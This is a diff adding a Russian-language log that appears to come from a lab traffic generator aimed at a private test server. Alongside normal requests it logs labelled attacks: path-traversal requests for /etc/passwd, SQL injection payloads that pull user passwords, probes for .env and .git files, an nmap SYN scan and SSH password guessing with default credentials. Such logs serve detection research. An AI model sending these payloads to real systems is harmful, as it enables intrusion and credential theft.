@@ -1,0 +1,56 @@
+=== ФАЗА: normal (легитимные запросы) ===
+ACTION|normal|главная страница|GET /|http://172.29.100.10/|HTTP 200 (9 ms)
+ACTION|normal|главная страница (html)|GET /index.html|http://172.29.100.10/index.html|HTTP 200 (0 ms)
+ACTION|normal|страница 'О сервере'|GET /about.html|http://172.29.100.10/about.html|HTTP 200 (0 ms)
+ACTION|normal|таблица стилей|GET /static/style.css|http://172.29.100.10/static/style.css|HTTP 200 (2 ms)
+ACTION|normal|служебный API-эндпоинт|GET /api/status|http://172.29.100.10/api/status|HTTP 200 (0 ms)
+ACTION|normal|пагинация списка|GET /?page=1&limit=10|http://172.29.100.10/?page=1&limit=10|HTTP 200 (0 ms)
+ACTION|normal|просмотр записи №42|GET /?id=42|http://172.29.100.10/?id=42|HTTP 200 (0 ms)
+ACTION|normal|поиск по сайту|GET /?search=nginx+configuration|http://172.29.100.10/?search=nginx+configuration|HTTP 200 (0 ms)
+ACTION|normal|страница с параметром языка|GET /about.html?lang=ru|http://172.29.100.10/about.html?lang=ru|HTTP 200 (0 ms)
+ACTION|normal|проверка доступности|HEAD /|http://172.29.100.10/|HTTP 200 (0 ms)
+ACTION|normal|обновление кэша стилей|GET /static/style.css?v=2|http://172.29.100.10/static/style.css?v=2|HTTP 200 (0 ms)
+ACTION|normal|повторный опрос статуса|GET /api/status|http://172.29.100.10/api/status|HTTP 200 (0 ms)
+=== ФАЗА: attack/http ===
+ACTION|traversal|path traversal: подняться к /etc/passwd|GET /../../etc/passwd|http://172.29.100.10/../../etc/passwd|HTTP 400 (0 ms)
+ACTION|traversal|path traversal: URL-encoded ../|GET /..%2f..%2f..%2fetc%2fpasswd|http://172.29.100.10/..%2f..%2f..%2fetc%2fpasswd|HTTP 400 (0 ms)
+ACTION|traversal|path traversal: %2e%2e вместо точек|GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd|http://172.29.100.10/%2e%2e/%2e%2e/%2e%2e/etc/passwd|HTTP 400 (0 ms)
+ACTION|traversal|path traversal: из статического каталога|GET /static/../../../../etc/passwd|http://172.29.100.10/static/../../../../etc/passwd|HTTP 400 (0 ms)
+ACTION|traversal|path traversal: с null-byte|GET /cgi-bin/../../../etc/passwd%00|http://172.29.100.10/cgi-bin/../../../etc/passwd%00|HTTP 400 (0 ms)
+ACTION|sqli|SQLi: тавтология 1' OR '1'='1|GET /?id=1%27%20OR%20%271%27%3D%271|http://172.29.100.10/?id=1%27%20OR%20%271%27%3D%271|HTTP 200 (1 ms)
+ACTION|sqli|SQLi: UNION SELECT из users|GET /?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--|http://172.29.100.10/?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--|HTTP 200 (0 ms)
+ACTION|sqli|SQLi: UNION ALL SELECT|GET /?q=%27%20UNION%20ALL%20SELECT%20password%20FROM%20users%23|http://172.29.100.10/?q=%27%20UNION%20ALL%20SELECT%20password%20FROM%20users%23|HTTP 200 (0 ms)
+ACTION|sqli|SQLi: обрыв условия комментарием|GET /?user=admin%27--|http://172.29.100.10/?user=admin%27--|HTTP 200 (0 ms)
+ACTION|sqli|SQLi: булева проверка AND 1=1|GET /?cat=1%20AND%201%3D1|http://172.29.100.10/?cat=1%20AND%201%3D1|HTTP 200 (0 ms)
+ACTION|scan-http|скан: поиск файла .env с секретами|GET /.env|http://172.29.100.10/.env|HTTP 404 (0 ms)
+ACTION|scan-http|скан: административная панель|GET /admin|http://172.29.100.10/admin|HTTP 404 (0 ms)
+ACTION|scan-http|скан: WordPress login|GET /wp-login.php|http://172.29.100.10/wp-login.php|HTTP 404 (0 ms)
+ACTION|scan-http|скан: phpMyAdmin|GET /phpmyadmin/|http://172.29.100.10/phpmyadmin/|HTTP 404 (0 ms)
+ACTION|scan-http|скан: архив бэкапа|GET /backup.zip|http://172.29.100.10/backup.zip|HTTP 404 (0 ms)
+ACTION|scan-http|скан: раскрытый .git|GET /.git/config|http://172.29.100.10/.git/config|HTTP 404 (0 ms)
+ACTION|scan-http|скан: бэкап конфигурации|GET /config.php.bak|http://172.29.100.10/config.php.bak|HTTP 404 (0 ms)
+ACTION|scan-http|скан: server-status Apache|GET /server-status|http://172.29.100.10/server-status|HTTP 404 (0 ms)
+ACTION|scan-http|скан: Spring Actuator|GET /actuator/health|http://172.29.100.10/actuator/health|HTTP 404 (0 ms)
+ACTION|scan-http|скан: старые cgi-скрипты|GET /cgi-bin/test-cgi|http://172.29.100.10/cgi-bin/test-cgi|HTTP 404 (0 ms)
+=== ФАЗА: attack/portscan (nmap SYN-scan) ===
+ACTION|scan-port|nmap SYN-скан топ-100 портов|nmap -sS -Pn -T4 --top-ports 100 172.29.100.10|172.29.100.10|открытых: 2
+    22/tcp open  ssh
+    80/tcp open  http
+=== ФАЗА: attack/ssh-bruteforce ===
+ACTION|ssh-brute|подбор пароля SSH|ssh root|root@172.29.100.10 (пароль: toor)|отказ (rc=255)
+ACTION|ssh-brute|подбор пароля SSH|ssh admin|admin@172.29.100.10 (пароль: admin)|отказ (rc=255)
+ACTION|ssh-brute|подбор пароля SSH|ssh dev|dev@172.29.100.10 (пароль: 123456)|отказ (rc=255)
+ACTION|ssh-brute|подбор пароля SSH|ssh test|test@172.29.100.10 (пароль: test)|отказ (rc=255)
+ACTION|ssh-brute|подбор пароля SSH|ssh root|root@172.29.100.10 (пароль: 123456)|отказ (rc=255)
+ACTION|ssh-brute|подбор пароля SSH|ssh admin|admin@172.29.100.10 (пароль: password)|отказ (rc=255)
+ACTION|ssh-brute|подбор пароля SSH|ssh ubuntu|ubuntu@172.29.100.10 (пароль: ubuntu)|отказ (rc=255)
+ACTION|ssh-brute|подбор пароля SSH|ssh oracle|oracle@172.29.100.10 (пароль: oracle)|отказ (rc=255)
+ACTION|ssh-brute|итог брутфорса|sshpass+ssh|172.29.100.10|успешно=0 неуспешно=0 ошибок=8
+=== ИТОГИ ГЕНЕРАЦИИ ===
+SUMMARY|normal|12
+SUMMARY|traversal|5
+SUMMARY|sqli|5
+SUMMARY|scan-http|10
+SUMMARY|scan-port|1
+SUMMARY|ssh-brute|8
+SUMMARY|total|41
